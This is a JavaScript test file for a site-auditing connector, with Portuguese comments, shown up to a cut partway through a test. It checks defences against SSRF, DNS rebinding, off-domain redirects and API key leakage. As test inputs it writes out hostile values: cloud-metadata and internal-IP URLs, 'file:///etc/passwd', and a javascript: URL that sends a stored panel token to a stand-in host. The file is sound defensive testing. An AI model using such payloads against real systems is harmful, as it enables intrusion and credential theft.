// O conector "site" do Marketing (supabase/functions/_shared/mkt-fontes/
// site.mjs), só com fixtures FICTÍCIAS (domínio exemplo.com.br) e fetch
// falso: nenhum pedido sai da máquina e nenhuma chave real entra. A chave
// daqui é texto de teste e o teste confere que ela não vaza para URL,
// resultado, aviso ou pedido ao site. Começa pelo caso ruim.
import {test} from 'node:test';import assert from 'node:assert/strict';import {readFileSync} from 'node:fs';import {createRequire} from 'node:module';import vm from 'node:vm';import {fileURLToPath} from 'node:url';
import * as site from '../supabase/functions/_shared/mkt-fontes/site.mjs';
const {coletar,alvoPermitido,dominioDoSite,ipPrivado,criarBuscador,lerCorpo,lerPagina,somarEtiquetas,atributos,decodificarEntidades,scriptsBase64,lerRobots,lerSitemap,lerWpItens,publicacoesDoWordpress,
 lerPageSpeed,lerCampoPsi,lerCrux,lerCruxHistorico,semanasFechadas,cwvPorSemana,lerDns,versaoAtrasada,motivoGoogle,urlPageSpeed,baseDaRest,escolherPaginas,conferir}=site;

const FIX=new URL('./fixtures/mkt-site/',import.meta.url);
const fx=n=>readFileSync(new URL(n,FIX),'utf8'),fj=n=>JSON.parse(fx(n));
const CHAVE='chave-de-teste-nao-e-de-verdade';
const HOJE='2026-10-11'; // um domingo: a semana de hoje (05/10 a 11/10) ainda não fechou
const O='https://exemplo.com.br';
const TRAVESSAO=/[\u2013\u2014]/;
const simples=x=>JSON.parse(JSON.stringify(x));

// ---------------------------------------------------------------- falsos --
// O site: uma rota por endereço (já normalizado pelo new URL), e a REST pelo
// rest_route. Rota que não existe responde 404, como o site de verdade.
const pagCom=t=>`<!DOCTYPE html><html lang="pt-BR"><head><title>${t}</title><script async src="https://www.googletagmanager.com/gtag/js?id=G-EXEMPLO123"></script><script>gtag('config','G-EXEMPLO123');gtag('config','AW-1234567890');fbq('init','111122223333444');</script></head><body><h1>${t}</h1></body></html>`;
const html=(corpo,h={})=>({status:200,corpo,headers:{'content-type':'text/html; charset=UTF-8',...h}});
const xml=corpo=>({status:200,corpo,headers:{'content-type':'application/xml'}});
const ir=(para,status=301)=>({status,corpo:'',headers:{location:para}});
function siteFalso(extra={}){
 const rotas={
  [`${O}/`]:html(fx('home.html'),{server:'nginx/1.24.0','x-powered-by':'PHP/8.3.0','x-cache':'MISS',link:`<${O}/index.php?rest_route=/>; rel="https://api.w.org/", <${O}/>; rel=shortlink`}),
  'https://www.exemplo.com.br/':ir(`${O}/`),
  [`${O}/robots.txt`]:{status:200,corpo:fx('robots.txt'),headers:{'content-type':'text/plain'}},
  // O defeito de links bonitos do nginx (achado real da pesquisa): laço de 301.
  [`${O}/sitemap_index.xml`]:ir(`${O}/sitemap_index.xml/`),
  [`${O}/sitemap_index.xml/`]:ir(`${O}/sitemap_index.xml/`),
  [`${O}/?sitemap=1`]:xml(fx('sitemap-indice.xml')),
  [`${O}/?sitemap=page&sitemap_n=1`]:xml(fx('sitemap-page.xml')),
  [`${O}/?sitemap=post&sitemap_n=1`]:xml(fx('sitemap-post.xml')),
  [`${O}/?sitemap=category&sitemap_n=1`]:xml(fx('sitemap-category.xml')),
  [`${O}/?page_id=151`]:html(fx('pagina-etiquetas.html')),
  [`${O}/?page_id=144`]:html(fx('pagina-simples.html')),
  [`${O}/?page_id=2`]:html(fx('pagina-exemplo.html')),
  [`${O}/?page_id=209`]:html(pagCom('Trabalhe conosco')),
  [`${O}/?p=1`]:html(pagCom('Olá, mundo!')),
  [`${O}/?cat=1`]:html(pagCom('Sem categoria')),
  'rest:/wp/v2/pages':{status:200,corpo:fx('wp-pages.json'),headers:{'content-type':'application/json','x-wp-total':'5','x-wp-totalpages':'1'}},
  'rest:/wp/v2/posts':{status:200,corpo:fx('wp-posts.json'),headers:{'content-type':'application/json','x-wp-total':'1','x-wp-totalpages':'1'}},
  'rest:/':{status:200,corpo:fx('wp-raiz.json'),headers:{'content-type':'application/json'}},
  ...extra};
 const pedidos=[];
 const fetch=async(url,init={})=>{
  pedidos.push({url,init});
  const u=new URL(url),rr=u.searchParams.get('rest_route');
  const r=rotas[rr!=null&&u.pathname==='/index.php'?`rest:${rr}`:url];
  if(!r)return new Response('<html>não achei</html>',{status:404});
  if(r.lancar)throw r.lancar;
  if(typeof r==='function')return r(url,init);
  return new Response(r.corpo,{status:r.status,headers:r.headers});
 };
 return {fetch,pedidos};
}
// O Google, o dns.google e o api.wordpress.org. O ctx.fetchJson devolve o
// JSON e LANÇA no erro, com .status e .corpo (como o ErroFonte da coletora;
// o envelope {status, json} tem teste próprio). O PageSpeed vem pelo
// ctx.fetch (Response), porque demora mais que os 20 s do fetchJson.
function googleFalso(r={}){
 const chamadas=[];
 const responder=(url,op)=>{
  const u=new URL(url);let c;
  if(u.hostname==='dns.google'){const n=u.searchParams.get('name'),t=u.searchParams.get('type');
   // 203.0.113.0/24 é a faixa de documentação: IP "de internet" de mentira.
   c=r.dns?.(n,t)??(t==='A'?{Status:0,Answer:[{name:`${n}.`,type:1,TTL:300,data:'203.0.113.10'}]}:t==='AAAA'?{Status:0}:t==='MX'?fj('dns-mx.json'):n.startsWith('_dmarc.')?fj('dns-dmarc.json'):fj('dns-txt.json'));}
  else if(u.hostname==='api.wordpress.org')c=u.pathname.includes('/core/')?fj('wporg-core.json'):fj(`wporg-${u.searchParams.get('request[slug]')}.json`);
  else if(u.hostname==='chromeuxreport.googleapis.com'){const b=JSON.parse(op.body);const hist=u.pathname.endsWith(':queryHistoryRecord');c=r.crux?r.crux(b,hist):hist?fj('crux-historico.json'):fj('crux-origem.json');}
  else if(u.hostname==='pagespeedonline.googleapis.com'){const est=u.searchParams.get('strategy'),cats=u.searchParams.getAll('category');c=r.psi?r.psi(est,cats):cats.includes('AGENTIC_BROWSING')?fj('psi-agentes.json'):fj(est==='MOBILE'?'psi-mobile.json':'psi-desktop.json');}
  else throw new Error('endereço inesperado no teste');
  return c;
 };
 const fetchJson=async(url,op={})=>{
  chamadas.push({url,op,via:'fetchJson'});
  const c=responder(url,op);
  if(c?.error)throw Object.assign(new Error(`chamada: http (HTTP ${c.error.code})`),{name:'ErroFonte',codigo:'http',status:c.error.code,corpo:c});
  return c;
 };
 const fetch=async(url,init={})=>{
  chamadas.push({url,op:init,via:'fetch'});
  const c=responder(url,init);
  return new Response(JSON.stringify(c),{status:c?.error?.code??200,headers:{'content-type':'application/json'}});
 };
 return {fetchJson,fetch,chamadas};
}
function montar({chave=CHAVE,canais=[{codigo:'site',url_perfil:O}],prazo=()=>100_000,rotas,google}={}){
 const s=siteFalso(rotas),g=googleFalso(google),log=[];
 // O ctx.fetch da coletora vai para os hosts da fonte: o site e o Google.
 const fetch=(url,init)=>(/\.googleapis\.com$/.test(new URL(url).hostname)?g.fetch(url,init):s.fetch(url,init));
 return {s,g,log,ctx:{env:n=>n==='GOOGLE_API_KEY'?chave:null,conexao:null,fetchJson:g.fetchJson,fetch,prazo,hoje:HOJE,canais,log:t=>log.push(t)}};
}
const doGoogle=g=>g.chamadas.filter(c=>/googleapis\.com/.test(c.url));
const daCrux=g=>g.chamadas.filter(c=>c.url.includes('chromeuxreport'));
const doPsi=g=>g.chamadas.filter(c=>c.url.includes('pagespeedonline'));
const codigos=r=>r.dados.conferencias.map(c=>c.codigo);
// Compara dois resultados sem o relógio (carimbo da coleta e tempo de resposta).
const tirarTempo=x=>JSON.parse(JSON.stringify(x).replace(/"coletado_em":"[^"]+"/g,'"coletado_em":"-"').replace(/"ms_(cabecalho|total)":\d+/g,'"ms_$1":0'));
function semSegredo(t,r){
 const texto=JSON.stringify(r);
 assert.ok(!texto.includes(CHAVE),'a chave apareceu no resultado');
 for(const c of t.g.chamadas)assert.ok(!c.url.includes(CHAVE),`a chave foi na URL: ${c.url.slice(0,60)}`);
 for(const p of t.s.pedidos){assert.ok(!JSON.stringify(p.init.headers??{}).includes(CHAVE),'a chave foi para o site');assert.ok(!p.url.includes(CHAVE));}
}

// ------------------------------------------------------- casos ruins --

test('O CASO RUIM: a trava do domínio recusa http, IP (até disfarçado), outro host, porta, senha na URL e nome interno', ()=>{
 const d='exemplo.com.br';
 for(const u of ['http://exemplo.com.br/','https://127.0.0.1/','https://2130706433/','https://0x7f.1/','https://[::1]/','https://169.254.169.254/latest',
  'https://exemplo.com.br.evil.com/','https://evilexemplo.com.br/','https://sub.exemplo.com.br/','https://exemplo.com.br:8443/','https://user:senha@exemplo.com.br/',
  'https://localhost/','https://intranet.local/','file:///etc/passwd','javascript:alert(1)','',null])assert.equal(alvoPermitido(u,d),null,String(u));
 assert.equal(alvoPermitido('https://exemplo.com.br/a?b=1#x',d),'https://exemplo.com.br/a?b=1');
 assert.equal(alvoPermitido('https://WWW.Exemplo.com.br/',d),'https://www.exemplo.com.br/');
 assert.equal(alvoPermitido('https://exemplo.com.br:443/',d),'https://exemplo.com.br/');
 for(const u of [null,'','exemplo.com.br','https://10.0.0.1','https://intranet.local','ftp://exemplo.com.br','https://site.com.br:8080','https://a:b@site.com.br'])assert.equal(dominioDoSite(u),null,String(u));
 assert.deepEqual(dominioDoSite('http://www.exemplo.com.br/x'),{dominio:'exemplo.com.br',host:'www.exemplo.com.br',inicio:'https://www.exemplo.com.br/'});
});

test('sem canal site, ou com endereço que não é público: falta_configurar e NENHUM pedido sai', async()=>{
 for(const canais of [[],[{codigo:'instagram',url_perfil:O}],[{codigo:'site',url_perfil:null}],[{codigo:'site',url_perfil:'https://192.168.0.10'}],[{codigo:'site',url_perfil:'https://intranet.local'}]]){
  const t=montar({canais}),r=await coletar(t.ctx);
  assert.equal(r.estado,'falta_configurar');assert.equal(r.conta,null);
  assert.equal(t.s.pedidos.length,0);assert.equal(t.g.chamadas.length,0);
  assert.deepEqual(r.semanas,[]);assert.deepEqual(r.publicacoes,[]);
  assert.ok(Object.values(r.partes).every(p=>p.estado==='falta_configurar'&&p.codigo==='sem_endereco'&&p.motivo===site.MOTIVOS.sem_endereco));
  assert.equal(r.avisos.length,1);assert.ok(!TRAVESSAO.test(r.avisos[0]));
 }
});

test('redirecionamento para fora do domínio para ali: o endereço interno NUNCA é pedido', async()=>{
 const t=montar({chave:null,rotas:{[`${O}/`]:ir('http://169.254.169.254/latest/meta-data/',302),[`${O}/?page_id=151`]:ir('https://evil.example.net/')}});
 const r=await coletar(t.ctx);
 assert.ok(!t.s.pedidos.some(p=>/169\.254|evil/.test(p.url)),'seguiu o redirecionamento para fora');
 assert.equal(r.partes.paginas.estado,'erro');assert.equal(r.partes.paginas.codigo,'redireciona_para_fora');
 assert.equal(r.partes.paginas.motivo,'O endereço redireciona para fora do domínio cadastrado no canal Site.');
 assert.ok(!('paginas' in r.dados));
 assert.ok(r.avisos.some(a=>/redireciona para fora/.test(a)));
 // Todo pedido ao site foi https, no domínio, com redirect manual e com prazo.
 for(const p of t.s.pedidos){assert.match(p.url,/^https:\/\/(www\.)?exemplo\.com\.br\//);assert.equal(p.init.redirect,'manual');assert.ok(p.init.signal);}
});

test('nome que aponta para IP interno (o "127.0.0.1.nip.io"): falta_configurar e NENHUM pedido ao site', async()=>{
 for(const [host,ip,tipo] of [['exemplo.com.br','127.0.0.1','A'],['www.exemplo.com.br','10.0.0.5','A'],['exemplo.com.br','169.254.169.254','A'],['exemplo.com.br','::1','AAAA'],['exemplo.com.br','fd00::1','AAAA']]){
  const t=montar({google:{dns:(n,tp)=>n===host&&tp===tipo?{Status:0,Answer:[{name:`${n}.`,type:tipo==='A'?1:28,data:ip}]}:undefined}});
  const r=await coletar(t.ctx);
  assert.equal(r.estado,'falta_configurar',ip);assert.equal(t.s.pedidos.length,0,ip);assert.equal(doGoogle(t.g).length,0,ip);
  assert.ok(Object.values(r.partes).every(p=>p.codigo==='ip_interno'&&/IP de rede interna/.test(p.motivo)));
  assert.ok(!TRAVESSAO.test(r.avisos[0]));
 }
 // DNS fora do ar: a coleta segue (e o diário conta).
 const t=montar({chave:null,google:{dns:(n,tp)=>tp==='A'||tp==='AAAA'?{error:{code:503}}:undefined}});
 const r=await coletar(t.ctx);
 assert.equal(r.partes.paginas.estado,'ok');assert.ok(t.log.some(l=>/IP do site não foi conferido/.test(l)));
});

test('O CASO RUIM: DNS que responde sem IP (SERVFAIL, NXDOMAIN, só CNAME) não conta como conferido: o nome não é pedido', async()=>{
 // O nome do cadastro sem IP de internet no DNS público: nada é pedido ao site.
 const respostas={
  servfail:()=>({Status:2}),
  nxdomain:()=>({Status:3}),
  'so-cname':(n)=>({Status:0,Answer:[{name:`${n}.`,type:5,TTL:300,data:'metadata.google.internal.'}]}),
  vazio:()=>({Status:0,Answer:[]}),
 };
 for(const [nome,resp] of Object.entries(respostas)){
  const t=montar({chave:null,google:{dns:(n,tp)=>(tp==='A'||tp==='AAAA')&&n==='exemplo.com.br'?resp(n):undefined}});
  const r=await coletar(t.ctx);
  assert.equal(t.s.pedidos.length,0,`${nome}: o site foi pedido sem IP conferido`);
  assert.equal(r.estado,'erro',nome);
  assert.ok(Object.values(r.partes).every(p=>p.estado==='erro'&&p.codigo==='sem_ip'&&/DNS público/.test(p.motivo)),nome);
  assert.match(r.avisos[0],/não mostrou um endereço de internet para exemplo\.com\.br/);
  assert.ok(!TRAVESSAO.test(r.avisos[0]));
  assert.ok(t.log.some(l=>/sem IP de internet|não mostrou IP de internet/.test(l)),nome);
  assert.deepEqual([r.semanas,r.publicacoes,r.dados],[[],[],{}]);
 }
 // Só o outro nome (com www) sem IP: o do cadastro é lido; o www nunca é pedido.
 const t=montar({chave:null,google:{dns:(n,tp)=>(tp==='A'||tp==='AAAA')&&n==='www.exemplo.com.br'?{Status:3}:undefined}});
 const r=await coletar(t.ctx);
 assert.equal(r.partes.paginas.estado,'ok');
 assert.ok(!t.s.pedidos.some(p=>new URL(p.url).hostname==='www.exemplo.com.br'),'pediu o nome sem IP');
 assert.ok(t.log.some(l=>/www\.exemplo\.com\.br sem IP de internet/.test(l)));
 // O buscador recusa o nome sem IP até no meio de um redirecionamento.
 const pedidos=[];
 const b=criarBuscador(async(u)=>{pedidos.push(u);return new Response('',{status:301,headers:{location:'https://www.exemplo.com.br/'}});},'exemplo.com.br',{semIp:['www.exemplo.com.br']});
 await assert.rejects(b('https://exemplo.com.br/'),e=>e.codigo==='sem_ip');
 assert.deepEqual(pedidos,['https://exemplo.com.br/']);
 // Com IP de internet nos dois, o diário lembra o risco que sobra.
 const ok=montar({chave:null});await coletar(ok.ctx);
 assert.ok(ok.log.some(l=>/DNS rebinding/.test(l)));
});

test('O CASO RUIM: o nome com ponto final (www.<domínio>. ou %2E) não fura a trava do semIp: ZERO pedidos ao www, e o diário não mente', async()=>{
 // A montagem do painel-mkt-fontes: o buscador DE VERDADE da coletora
 // (regraDeHosts, conferirUrl, redirect manual) por cima de um transporte
 // falso. No DNS público, o www só tem um CNAME para um nome que só a rede
 // de dentro resolve (NXDOMAIN): vai para o semIp e não pode ser pedido.
 const {criarBuscador:buscadorDaColetora,regraDeHosts}=await import('../supabase/functions/_shared/mkt-fontes/coletora.mjs');
 const DOM='exemplo.com.br',WWW=`www.${DOM}`,canais=[{codigo:'site',url_perfil:`https://${DOM}`}];
 const nome=(u)=>{try{return new URL(u).hostname.toLowerCase().replace(/\.+$/,'');}catch{return null;}};
 const rodar=async({para=null,robots=null}={})=>{
  const transporte=[];
  const fetch=async(url,init={})=>{
   transporte.push(String(url));
   const u=new URL(url);
   if(u.hostname==='dns.google'){
    const n=u.searchParams.get('name'),tp=u.searchParams.get('type');
    let c={Status:0};
    if(n===DOM&&tp==='A')c={Status:0,Answer:[{name:`${n}.`,type:1,TTL:300,data:'203.0.113.10'}]};
    if(n===WWW&&(tp==='A'||tp==='AAAA'))c={Status:3,Answer:[{name:`${n}.`,type:5,TTL:300,data:'ip-10-0-0-5.ec2.internal.'}]};
    return new Response(JSON.stringify(c),{status:200,headers:{'content-type':'application/json'}});
   }
   if(u.hostname==='api.wordpress.org')return new Response('{}',{status:200,headers:{'content-type':'application/json'}});
   // O nome de dentro: um pedido que chegasse aqui já seria o SSRF.
   if(nome(url)===WWW)throw new TypeError('tcp connect error: Connection refused');
   if(robots){
    if(u.pathname==='/robots.txt')return new Response(robots,{status:200,headers:{'content-type':'text/plain'}});
    if(u.pathname==='/'&&!u.search)return new Response('<!DOCTYPE html><html><head><title>Loja</title></head><body><h1>Oi</h1></body></html>',{status:200,headers:{'content-type':'text/html'}});
    return new Response('<html>nada</html>',{status:404});
   }
   // O apex manda tudo para o www, com o caminho: o "redirect para www" comum.
   return new Response(null,{status:301,headers:{location:para.replace(/\/$/,'')+u.pathname+u.search}});
  };
  const log=[];
  const b=buscadorDaColetora({fetch,regra:regraDeHosts('site',canais),prazo:()=>100_000});
  const r=await coletar({env:()=>null,conexao:null,fetchJson:b.fetchJson,fetchTexto:b.fetchTexto,fetch:b.fetch,prazo:()=>100_000,hoje:HOJE,canais,log:t=>log.push(t)});
  return {r,log,aoWww:transporte.filter(x=>nome(x)===WWW)};
 };
 // Controle: o 301 para o www sem ponto já parava (é o teste anterior).
 const controle=await rodar({para:`https://${WWW}/`});
 assert.deepEqual(controle.aoWww,[]);
 for(const [caso,montagem] of Object.entries({
  'ponto final':{para:`https://${WWW}./`},
  '%2E':{para:`https://${WWW}%2E/`},
  'dois pontos':{para:`https://${WWW}../`},
  // Sem redirecionamento: o robots.txt do apex aponta o sitemap no www com
  // ponto final, e com o ponto largo (U+3002), que o parser de URL vira ponto.
  'robots':{robots:`User-agent: *\nDisallow:\nSitemap: https://${WWW}./sitemap.xml\nSitemap: https://${WWW}\u3002/outro.xml\n`},
 })){
  const {r,log,aoWww}=await rodar(montagem);
  assert.deepEqual(aoWww,[],`${caso}: pedido saiu para o nome sem IP no DNS público`);
  // O diário afirma que o www não será pedido; com zero pedidos, é verdade.
  assert.ok(log.some(l=>new RegExp(`${WWW.replace(/\./g,'\\.')} sem IP de internet no DNS público; não será pedido`).test(l)),caso);
  // O que o transporte acharia no nome de dentro (rede, certificado, tempo)
  // não vira oráculo nas partes: nenhuma tentativa, nenhum motivo de rede.
  for(const [parte,p] of Object.entries(r.partes))assert.ok(!['rede','certificado','tempo_esgotado','dns'].includes(p.codigo),`${caso}: ${parte} com ${p.codigo}`);
  if(montagem.para&&caso!=='dois pontos')assert.deepEqual([r.partes.paginas.estado,r.partes.paginas.codigo],['erro','sem_ip'],caso);
 }
 // As peças: a URL que sai da trava do site e da coletora não leva o ponto.
 assert.equal(alvoPermitido(`https://${WWW}./a?b=1#c`,DOM),`https://${WWW}/a?b=1`);
 assert.equal(alvoPermitido(`https://${WWW}%2E/`,DOM),`https://${WWW}/`);
 assert.equal(alvoPermitido(`https://${WWW}../`,DOM),null,'rótulo vazio é nome torto');
 assert.equal(alvoPermitido(`https://${DOM}./`,DOM),`https://${DOM}/`);
 const pedidos=[];
 const so=criarBuscador(async(u)=>{pedidos.push(u);throw new TypeError('Connection refused');},DOM,{semIp:[`${WWW}.`]});
 for(const u of [`https://${WWW}/`,`https://${WWW}./`,`https://${WWW}%2E/x`])await assert.rejects(so(u),e=>e.codigo==='sem_ip',u);
 assert.deepEqual(pedidos,[]);
});

test('O CASO RUIM: endereço tirado do HTML, da REST, do robots e do sitemap só vai para os dados como http(s); "javascript:" vira null', ()=>{
 const js="javascript:fetch('https://x.example/?c='+localStorage.getItem('painel_token'))";
 const html=`<html><head><title>X</title>
  <link rel="canonical" href="${js.replace(/'/g,'&#39;')}">
  <meta property="og:url" content="javascript:alert(1)"><meta property="og:image" content="&#106;avascript:alert(2)">
  <script type="application/ld+json">{"@type":"LocalBusiness","name":"X","logo":"javascript:alert(3)","sameAs":["javascript:alert(4)","https://www.instagram.com/x","data:text/html,oi"]}</script>
  </head><body></body></html>`;
 const p=lerPagina(html);
 assert.equal(p.seo.canonical,null);assert.equal(p.og.url,null);assert.equal(p.og.imagem,null);
 assert.equal(p.dados_estruturados.logo,null);assert.deepEqual(p.dados_estruturados.mesmo_que,['https://www.instagram.com/x']);
 assert.equal(JSON.stringify(p).toLowerCase().includes('javascript:'),false);
 // O que é endereço de verdade continua.
 const bom=lerPagina('<html><head><link rel="canonical" href="https://exemplo.com.br/a"><meta property="og:image" content="https://exemplo.com.br/i.jpg"><meta property="og:url" content="http://exemplo.com.br/"></head></html>');
 assert.deepEqual([bom.seo.canonical,bom.og.imagem,bom.og.url],['https://exemplo.com.br/a','https://exemplo.com.br/i.jpg','http://exemplo.com.br/']);
 assert.equal(lerPagina('<html><head><link rel="canonical" href="/relativo"></head></html>').seo.canonical,null,'relativo não é endereço absoluto');
 // REST, robots e sitemap.
 assert.deepEqual(lerWpItens([{id:1,title:{rendered:'A'},link:'javascript:alert(5)'},{id:2,title:{rendered:'B'},link:'https://exemplo.com.br/b'}],'page').map(i=>i.link),[null,'https://exemplo.com.br/b']);
 assert.deepEqual(lerRobots('Sitemap: javascript:alert(6)\nSitemap: https://exemplo.com.br/s.xml').sitemaps,['https://exemplo.com.br/s.xml']);
 assert.deepEqual(lerSitemap('<urlset><url><loc>javascript:alert(7)</loc></url><url><loc>https://exemplo.com.br/x</loc></url></urlset>').itens.map(i=>i.loc),['https://exemplo.com.br/x']);
 assert.equal(site.urlHttp(' https://exemplo.com.br/a '),'https://exemplo.com.br/a');
 for(const ruim of ['JAVASCRIPT:alert(1)','vbscript:x','data:text/html,x','//exemplo.com.br','https://exemplo.com.br/\u0000',null,42])assert.equal(site.urlHttp(ruim),null,String(ruim));
});

test('ipPrivado: as faixas internas, e IP de internet passa', ()=>{
 for(const ip of ['127.0.0.1','10.1.2.3','172.16.0.1','172.31.255.255','192.168.0.1','169.254.169.254','100.64.0.1','0.0.0.0','224.0.0.1','::1','fe80::1','fc00::1','::ffff:127.0.0.1','lixo',''])assert.equal(ipPrivado(ip),true,ip);
 for(const ip of ['203.0.113.10','8.8.8.8','172.32.0.1','2001:4860:4860::8888'])assert.equal(ipPrivado(ip),false,ip);
});

test('cadastro com www num site que vive sem www: mede o endereço FINAL e não acusa "abre dos dois jeitos"', async()=>{
 const t=montar({canais:[{codigo:'site',url_perfil:'https://www.exemplo.com.br'}]}),r=await coletar(t.ctx);
 assert.equal(t.s.pedidos[0].url,'https://www.exemplo.com.br/');
 assert.equal(r.dados.site.inicio,`${O}/`);assert.equal(r.dados.paginas.lista[0].url,`${O}/`);
 assert.deepEqual(r.dados.paginas.redirecionamento_www,{de:'https://www.exemplo.com.br/',status:301,para:`${O}/`});
 assert.ok(!codigos(r).includes('www_duplicado'));
 for(const c of daCrux(t.g)){const b=JSON.parse(c.op.body);assert.ok(b.origin===O||b.url===`${O}/`,c.op.body);}
 for(const c of doPsi(t.g))assert.equal(new URL(c.url).searchParams.get('url'),`${O}/`);
 assert.equal(r.dados.pagespeed.url,`${O}/`);
 // E o contrário: o site abre com e sem www sem redirecionar, isso sim é achado.
 const t2=montar({chave:null,rotas:{'https://www.exemplo.com.br/':html('<html><head><title>cópia</title></head></html>')}});
 assert.ok(codigos(await coletar(t2.ctx)).includes('www_duplicado'));
});

test('página do sitemap presa em laço de redirecionamento vira achado, sem derrubar a parte', async()=>{
 const t=montar({chave:null,rotas:{[`${O}/?page_id=144`]:ir(`${O}/?page_id=144`)}});
 const r=await coletar(t.ctx);
 assert.equal(r.partes.paginas.estado,'ok');
 const c=r.dados.conferencias.find(x=>x.codigo==='paginas_com_erro');
 assert.equal(c.texto,'1 página listada respondeu com erro: /?page_id=144 (laço de redirecionamento).');
});

test('laço de redirecionamento e salto demais param no limite', async()=>{
 const pedidos=[];
 const f=async(url)=>{pedidos.push(url);const n=Number(new URL(url).searchParams.get('n')??0);return new Response('',{status:301,headers:{location:`${O}/?n=${n+1}`}});};
 const buscar=criarBuscador(f,'exemplo.com.br');
 await assert.rejects(buscar(`${O}/?n=0`),e=>e.codigo==='saltos_demais'&&e.caminho.length===4);
 assert.equal(pedidos.length,4); // a original e 3 saltos
 const laco=criarBuscador(async()=>new Response('',{status:301,headers:{location:`${O}/a/`}}),'exemplo.com.br');
 await assert.rejects(laco(`${O}/a`),e=>e.codigo==='laco');
 // seguir:false devolve o primeiro salto sem pedir o destino.
 const um=await criarBuscador(async()=>new Response('',{status:301,headers:{location:'https://outro.com/'}}),'exemplo.com.br')(`${O}/`,{seguir:false});
 assert.equal(um.status,301);assert.equal(um.para,null);assert.equal(um.fora,true);
});

test('página de mais de 2 MB: lê só 2 MB e PARA de baixar (não lê os 50 MB)', async()=>{
 let entregue=0;const pedaco=new Uint8Array(64*1024).fill(97);
 const corpo=new ReadableStream({pull(c){if(entregue>=50*1024*1024){c.close();return;}entregue+=pedaco.byteLength;c.enqueue(pedaco);}},{highWaterMark:0});
 const r=await lerCorpo(new Response(corpo));
 assert.equal(r.bytes,2*1024*1024);assert.equal(r.truncado,true);assert.equal(r.texto.length,2*1024*1024);
 assert.ok(entregue<=3*1024*1024,`baixou ${entregue} bytes`);
 const pequeno=await lerCorpo(new Response('olá'));
 assert.deepEqual(pequeno,{texto:'olá',bytes:4,truncado:false});
});

test('sem GOOGLE_API_KEY: PageSpeed e CrUX ficam falta_configurar, nenhum pedido ao Google, e o resto funciona', async()=>{
 const t=montar({chave:null}),r=await coletar(t.ctx);
 assert.equal(doGoogle(t.g).length,0);
 assert.deepEqual([r.partes.pagespeed.estado,r.partes.pagespeed.codigo],['falta_configurar','sem_chave']);
 assert.deepEqual([r.partes.crux.estado,r.partes.crux.codigo],['falta_configurar','sem_chave']);
 for(const p of ['paginas','robots','sitemap','wordpress','dns','versoes'])assert.equal(r.partes[p].estado,'ok',p);
 assert.equal(r.estado,'parcial');
 assert.ok(!('pagespeed' in r.dados)&&!('crux' in r.dados));
 assert.ok(r.avisos.some(a=>/GOOGLE_API_KEY/.test(a)));
 assert.equal(r.publicacoes.length,4);
 assert.deepEqual(site.SECRETS,[]);assert.deepEqual(site.SECRETS_OPCIONAIS,['GOOGLE_API_KEY']);
});

test('chave recusada (400 API_KEY_INVALID): UMA chamada só, nada de PageSpeed, e a chave não aparece em lugar nenhum', async()=>{
 const t=montar({google:{crux:()=>fj('erro-chave-invalida.json')}}),r=await coletar(t.ctx);
 assert.equal(doGoogle(t.g).length,1);assert.equal(doPsi(t.g).length,0);
 assert.deepEqual([r.partes.crux.estado,r.partes.crux.codigo],['falta_configurar','chave_recusada']);
 assert.deepEqual([r.partes.pagespeed.estado,r.partes.pagespeed.codigo],['falta_configurar','chave_recusada']);
 assert.equal(r.avisos.filter(a=>/recusou a chave/.test(a)).length,1);
 // A mensagem do Google não é repetida para fora.
 assert.ok(!JSON.stringify(r).includes('API key not valid'));
 assert.equal(r.estado,'parcial');
 semSegredo(t,r);
});

test('a chave vai SÓ no cabeçalho x-goog-api-key; o PageSpeed vai pelo ctx.fetch (o fetchJson corta em 20 s)', async()=>{
 const t=montar(),r=await coletar(t.ctx);
 assert.equal(doGoogle(t.g).length,10);
 for(const c of doGoogle(t.g)){assert.equal(c.op.headers['x-goog-api-key'],CHAVE);assert.ok(!/[?&]key=/.test(c.url));}
 for(const c of doPsi(t.g)){assert.equal(c.via,'fetch');assert.ok(c.op.signal);assert.equal(c.op.method,'GET');}
 for(const c of daCrux(t.g))assert.equal(c.via,'fetchJson');
 for(const c of t.g.chamadas.filter(c=>!/googleapis\.com/.test(c.url)))assert.ok(!c.op.headers?.['x-goog-api-key'],c.url);
 const cats=doPsi(t.g).map(c=>new URL(c.url).searchParams.getAll('category').join(',')).sort();
 // As quatro categorias principais numa chamada; AGENTIC_BROWSING sozinha em outra (celular e computador).
 assert.deepEqual(cats,['AGENTIC_BROWSING','AGENTIC_BROWSING','PERFORMANCE,ACCESSIBILITY,BEST_PRACTICES,SEO','PERFORMANCE,ACCESSIBILITY,BEST_PRACTICES,SEO']);
 for(const c of doPsi(t.g)){const u=new URL(c.url);assert.equal(u.searchParams.get('url'),`${O}/`);assert.equal(u.searchParams.get('locale'),'pt_BR');}
 const hist=daCrux(t.g).filter(c=>c.url.endsWith(':queryHistoryRecord')).map(c=>JSON.parse(c.op.body));
 assert.deepEqual(hist.map(b=>[b.formFactor,b.collectionPeriodCount]),[['PHONE',25],['DESKTOP',25]]);
 semSegredo(t,r);
});

test('sem ctx.fetch: o site usa o fetch global com as MESMAS travas, e o PageSpeed cai no fetchJson pedindo timeoutMs', async()=>{
 const t=montar();delete t.ctx.fetch;
 const original=globalThis.fetch;globalThis.fetch=t.s.fetch; // nada sai para a rede de verdade
 try{
  const r=await coletar(t.ctx);
  assert.equal(r.estado,'ok');
  for(const c of doPsi(t.g)){assert.equal(c.via,'fetchJson');assert.ok(c.op.timeoutMs>20_000&&c.op.timeoutMs<=100_000,String(c.op.timeoutMs));}
  for(const p of t.s.pedidos)assert.equal(p.init.redirect,'manual');
 }finally{globalThis.fetch=original;}
});

test('PageSpeed que passa de 8 MB não é lido inteiro: grande_demais, sem derrubar a CrUX', async()=>{
 const t=montar();
 const enorme=new Response(new ReadableStream({start(c){const p=new Uint8Array(1024*1024).fill(32);for(let i=0;i<9;i++)c.enqueue(p);c.close();}}),{status:200});
 const fetchOriginal=t.ctx.fetch;
 t.ctx.fetch=(url,init)=>(/pagespeedonline/.test(url)?Promise.resolve(enorme.clone()):fetchOriginal(url,init));
 const r=await coletar(t.ctx);
 assert.deepEqual([r.partes.pagespeed.estado,r.partes.pagespeed.codigo],['erro','grande_demais']);
 assert.equal(r.partes.crux.estado,'ok');
});

test('API do PageSpeed desativada (403): só o PageSpeed para; a CrUX segue', async()=>{
 const t=montar({google:{psi:()=>fj('erro-api-desativada.json')}}),r=await coletar(t.ctx);
 assert.deepEqual([r.partes.pagespeed.estado,r.partes.pagespeed.codigo],['falta_configurar','api_bloqueada']);
 assert.equal(r.partes.crux.estado,'ok');assert.ok(r.dados.crux.origem.celular);
 assert.ok(!('pagespeed' in r.dados));
